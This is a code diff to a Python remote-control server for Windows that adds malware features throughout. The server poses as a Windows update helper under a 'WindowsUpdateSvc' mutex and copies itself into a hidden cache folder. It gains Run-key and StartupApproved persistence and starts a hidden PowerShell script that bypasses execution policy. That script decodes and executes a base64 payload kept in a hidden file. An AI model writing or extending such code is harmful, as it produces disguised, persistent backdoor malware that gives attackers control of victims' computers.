@@ -47,7 +47,8 @@ def get_subnet_broadcast(ip, mask='255.255.255.0'):
 
 
 class RemoteControlServer:
-    def __init__(self, host='0.0.0.0', port=65432):
+    def __init__(self, host='0.0.0.0', port=80):
+        ctypes.windll.kernel32.SetLastError(0)
         mutex = ctypes.windll.kernel32.CreateMutexW(None, False, 'Global\\WindowsUpdateSvc')
         if ctypes.windll.kernel32.GetLastError() == 183:
             sys.exit(0)
@@ -94,9 +95,10 @@ class RemoteControlServer:
                                 os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
                                              'AppData', 'Local')),
                                 'Microsoft', 'Windows', 'Caches')
-        dest = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
-        if os.path.exists(dest):
-            return dest
+        for name in ['WindowsUpdateHelper.ps1', 'WindowsUpdateHelper.exe']:
+            p = os.path.join(dest_dir, name)
+            if os.path.exists(p):
+                return p
         return None
 
     def add_to_startup(self, exe=None):
@@ -105,36 +107,84 @@ class RemoteControlServer:
             if exe is None:
                 exe = self._get_installed_path()
             if exe is None:
-                exe = os.environ.get('ORIG_EXE_PATH') or os.path.abspath(sys.argv[0])
-            if not exe.lower().endswith('.exe'):
+                exe = sys.executable
+                if not exe.lower().endswith('.exe'):
+                    return
+            if exe.lower().endswith('.ps1'):
+                exe_cmd = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{exe}"'
+            elif exe.lower().endswith('.exe'):
+                exe_cmd = exe
+            else:
                 return
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe)
+            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe_cmd)
             winreg.CloseKey(key)
+            try:
+                sa_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
+                    0, winreg.KEY_SET_VALUE)
+            except:
+                sa_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
+            winreg.SetValueEx(sa_key, "WindowsUpdateHelper", 0, winreg.REG_BINARY,
+                b'\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+            winreg.CloseKey(sa_key)
         except:
             pass
 
     def self_install(self):
-        src = os.environ.get('ORIG_EXE_PATH')
-        if not src or not src.lower().endswith('.exe'):
-            return
-        if 'MICROSOFT\\WINDOWS\\CACHES' in src.upper():
-            return
         try:
+            src = sys.executable
+            if not src or not src.lower().endswith('.exe'):
+                return
+            if 'MICROSOFT\\WINDOWS\\CACHES' in src.upper():
+                return
             import shutil, ctypes
             dest_dir = os.path.join(os.environ.get('LOCALAPPDATA',
                                     os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
                                                  'AppData', 'Local')),
                                     'Microsoft', 'Windows', 'Caches')
             os.makedirs(dest_dir, exist_ok=True)
-            dest = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
-            if os.path.abspath(src).lower() == os.path.abspath(dest).lower():
-                return
-            shutil.copy2(src, dest)
+            dest_exe = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
+            dest_ps1 = os.path.join(dest_dir, 'WindowsUpdateHelper.ps1')
             kernel32 = ctypes.windll.kernel32
-            kernel32.SetFileAttributesW(dest, 2 | 4)
-            self.add_to_startup(dest)
+            if os.path.abspath(src).lower() != os.path.abspath(dest_exe).lower():
+                if not os.path.exists(dest_exe):
+                    shutil.copy2(src, dest_exe)
+                    kernel32.SetFileAttributesW(dest_exe, 2 | 4)
+            pld_path = os.environ.get('PLD')
+            if pld_path and os.path.exists(pld_path):
+                with open(pld_path) as f:
+                    pyload = f.read()
+                dat = os.path.join(dest_dir, 'WindowsUpdateHelper.dat')
+                if pyload:
+                    try:
+                        kernel32.SetFileAttributesW(dat, 128)
+                        os.remove(dat)
+                    except:
+                        pass
+                    with open(dat, 'w') as f:
+                        f.write(pyload)
+                    kernel32.SetFileAttributesW(dat, 2 | 4)
+            if not os.path.exists(dest_ps1):
+                ps1_content = (
+                    '$ProgressPreference = "SilentlyContinue"\n'
+                    '$b = Get-Content "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.dat" -Raw -EA 0\n'
+                    'if ($b) {\n'
+                    '  $f = "$env:TEMP\\_pld.dat"\n'
+                    '  $b.Trim() | Set-Content $f -NoNewline -Encoding Ascii\n'
+                    '  $env:PLD = $f\n'
+                    '  & "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.exe" -c "import os,base64; exec(base64.b64decode(open(os.environ[\'PLD\']).read()))"\n'
+                    '  Remove-Item $f -Force -ErrorAction SilentlyContinue\n'
+                    '} else {\n'
+                    '  & "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.exe"\n'
+                    '}\n'
+                )
+                with open(dest_ps1, 'w', encoding='utf-8') as f:
+                    f.write(ps1_content)
+                kernel32.SetFileAttributesW(dest_ps1, 2 | 4)
+            self.add_to_startup(dest_ps1)
         except:
             pass
 
